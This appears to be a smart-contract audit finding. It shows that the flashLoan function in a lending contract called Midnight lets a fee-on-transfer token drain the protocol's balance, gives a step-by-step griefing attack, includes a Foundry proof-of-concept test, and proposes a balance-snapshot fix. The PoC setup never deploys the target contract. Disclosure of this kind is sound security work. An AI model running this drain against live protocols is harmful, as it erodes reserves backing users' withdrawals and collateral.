### Title
Fee-on-Transfer Token Drains Protocol Balance in flashLoan - (File: src/Midnight.sol)

### Summary
The `flashLoan` function in `src/Midnight.sol` sends `assets[i]` to the callback and then pulls back exactly `assets[i]` via `safeTransferFrom`, with no balance snapshot or post-repayment balance check. When a fee-on-transfer token is used, the inbound `safeTransferFrom` delivers only `assets[i] * (1 - fee)` to Midnight, permanently reducing its balance by `assets[i] * fee` per call. No existing check prevents this.

### Finding Description
**Code path:** `src/Midnight.sol` lines 737–752.

```
flashLoan(tokens, assets, callback, data)
  → safeTransfer(tokens[i], callback, assets[i])          // Midnight sends assets[i]; callback receives assets[i]*(1-fee)
  → onFlashLoan(callback)                                  // callback executes
  → safeTransferFrom(tokens[i], callback, this, assets[i]) // pulls assets[i]; Midnight receives assets[i]*(1-fee)
``` [1](#0-0) 

`SafeTransferLib.safeTransfer` and `safeTransferFrom` only verify the boolean return value and revert propagation — they perform no balance accounting. [2](#0-1) 

**Root cause:** No `balanceOf(address(this))` snapshot is taken before the outbound transfer, and no assertion that `balanceOf(address(this)) >= snapshot` is made after the inbound `safeTransferFrom`. The protocol blindly trusts that pulling `assets[i]` restores the original balance.

**Attacker inputs and exploit flow:**

1. Attacker pre-funds the callback contract with `assets[i] * fee` tokens (e.g., 10e18 for a 1% fee on 1000e18).
2. Attacker calls `midnight.flashLoan([feeToken], [1000e18], callbackAddr, "")`.
3. `safeTransfer(feeToken, callbackAddr, 1000e18)`: Midnight balance drops by 1000e18; callback receives 990e18 (1% fee taken). Callback now holds 990e18 + 10e18 pre-funded = 1000e18.
4. `onFlashLoan` returns `CALLBACK_SUCCESS`.
5. `safeTransferFrom(feeToken, callbackAddr, address(this), 1000e18)`: callback sends 1000e18; fee taken again; Midnight receives 990e18.
6. Midnight's net balance change: −1000e18 + 990e18 = **−10e18**.

**Why checks fail:** The only checks are `tokens.length == assets.length` (array length parity) and `CALLBACK_SUCCESS` return value. Neither touches token balances. There is no `require(IERC20(tokens[i]).balanceOf(address(this)) >= balanceBefore[i])` guard anywhere in the function. [3](#0-2) 

### Impact Explanation
Midnight's token balance decreases by `assets[i] * fee` per flash loan call. Since the protocol holds loan tokens and collateral tokens that back user positions, repeated calls erode the reserve, eventually making it impossible to honor withdrawals, collateral releases, or fee claims — violating the core invariant that contract balances cover all liabilities.

### Likelihood Explanation
**Preconditions:**
- A fee-on-transfer token must be held by Midnight (e.g., as a loan token or collateral token in an active market).
- The attacker must pre-fund the callback with `assets[i] * fee` tokens to make `safeTransferFrom` succeed (otherwise it reverts on insufficient balance).

**Feasibility:** Any unprivileged address can call `flashLoan` — there is no access control. The attacker loses `assets[i] * fee` tokens per call (griefing, not profitable), but the protocol loses the same amount. The attack is repeatable at any time while the fee-on-transfer token is held by Midnight. Real-world fee-on-transfer tokens (e.g., PAXG, STA, tokens with configurable fees) exist and could be listed as collateral or loan tokens by market creators.

### Recommendation
Snapshot each token balance before the outbound transfer and assert it is restored after the inbound `safeTransferFrom`:

```solidity
uint256[] memory balancesBefore = new uint256[](tokens.length);
for (uint256 i = 0; i < tokens.length; i++) {
    balancesBefore[i] = IERC20(tokens[i]).balanceOf(address(this));
    SafeTransferLib.safeTransfer(tokens[i], callback, assets[i]);
}
// ... callback ...
for (uint256 i = 0; i < tokens.length; i++) {
    SafeTransferLib.safeTransferFrom(tokens[i], callback, address(this), assets[i]);
    require(IERC20(tokens[i]).balanceOf(address(this)) >= balancesBefore[i], BalanceDecreased());
}
```

This is the standard pattern used by Morpho Blue and Aave v3 flash loans.

### Proof of Concept
**Foundry unit test plan:**

```solidity
// FeeOnTransferToken: transfer/transferFrom deduct 1% fee from received amount
contract FeeOnTransferToken is ERC20 {
    function _transfer(address from, address to, uint256 amount) internal override {
        uint256 fee = amount / 100;
        super._transfer(from, to, amount - fee); // receiver gets 99%
        super._transfer(from, address(0xfee), fee); // 1% burned/sent to fee sink
    }
}

contract FeeOnTransferFlashLoanTest is IFlashLoanCallback {
    FeeOnTransferToken token;
    Midnight midnight;

    function setUp() public {
        token = new FeeOnTransferToken();
        // seed midnight with 1000e18
        token.mint(address(midnight), 1000e18);
        // pre-fund this callback with 10e18 (the fee amount)
        token.mint(address(this), 10e18);
        token.approve(address(midnight), type(uint256).max);
    }

    function testFeeOnTransferDrainsMidnight() public {
        uint256 balBefore = token.balanceOf(address(midnight)); // 1000e18

        address[] memory tokens = new address[](1);
        tokens[0] = address(token);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 1000e18;

        midnight.flashLoan(tokens, amounts, address(this), "");

        uint256 balAfter = token.balanceOf(address(midnight));
        // ASSERTION: balAfter == balBefore - 10e18 (drained by fee)
        assertEq(balAfter, balBefore - 10e18, "midnight balance drained by fee");
    }

    function onFlashLoan(address, address[] memory, uint256[] memory, bytes memory)
        external returns (bytes32)
    {
        // callback holds 990e18 (received) + 10e18 (pre-funded) = 1000e18
        // approval already set; safeTransferFrom will pull 1000e18, midnight gets 990e18
        return CALLBACK_SUCCESS;
    }
}
```

**Expected assertion:** `assertEq(token.balanceOf(address(midnight)), 990e18)` — confirming the 10e18 drain. An invariant fuzz test can also assert `balanceOf(midnight, token) >= balanceOf_before` across all `flashLoan` calls.

### Citations

**File:** src/Midnight.sol (L740-751)
```text
        require(tokens.length == assets.length, InconsistentInput());
        emit EventsLib.FlashLoan(msg.sender, tokens, assets, callback);
        for (uint256 i = 0; i < tokens.length; i++) {
            SafeTransferLib.safeTransfer(tokens[i], callback, assets[i]);
        }
        require(
            IFlashLoanCallback(callback).onFlashLoan(msg.sender, tokens, assets, data) == CALLBACK_SUCCESS,
            WrongFlashLoanCallbackReturnValue()
        );
        for (uint256 i = 0; i < tokens.length; i++) {
            SafeTransferLib.safeTransferFrom(tokens[i], callback, address(this), assets[i]);
        }
```

**File:** src/libraries/SafeTransferLib.sol (L12-34)
```text
    function safeTransfer(address token, address to, uint256 value) internal {
        require(token.code.length > 0, NoCode());

        (bool success, bytes memory returndata) = token.call(abi.encodeCall(IERC20.transfer, (to, value)));
        if (!success) {
            assembly ("memory-safe") {
                revert(add(returndata, 0x20), mload(returndata))
            }
        }
        require(returndata.length == 0 || abi.decode(returndata, (bool)), TransferReturnedFalse());
    }

    function safeTransferFrom(address token, address from, address to, uint256 value) internal {
        require(token.code.length > 0, NoCode());

        (bool success, bytes memory returndata) = token.call(abi.encodeCall(IERC20.transferFrom, (from, to, value)));
        if (!success) {
            assembly ("memory-safe") {
                revert(add(returndata, 0x20), mload(returndata))
            }
        }
        require(returndata.length == 0 || abi.decode(returndata, (bool)), TransferFromReturnedFalse());
    }
```
